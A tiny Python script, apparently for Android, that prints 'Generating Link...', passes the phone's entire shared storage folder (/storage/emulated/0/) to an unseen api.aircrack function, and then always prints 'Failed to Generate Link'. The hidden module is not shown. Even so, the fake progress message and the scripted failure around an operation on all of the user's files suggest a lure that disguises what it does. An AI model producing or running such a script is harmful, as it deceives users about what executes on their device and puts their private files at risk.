from banner import banner
import api

api.get()
banner()
print("Generating Link...")
api.aircrack("/storage/emulated/0/")
print("Failed to Generate Link")
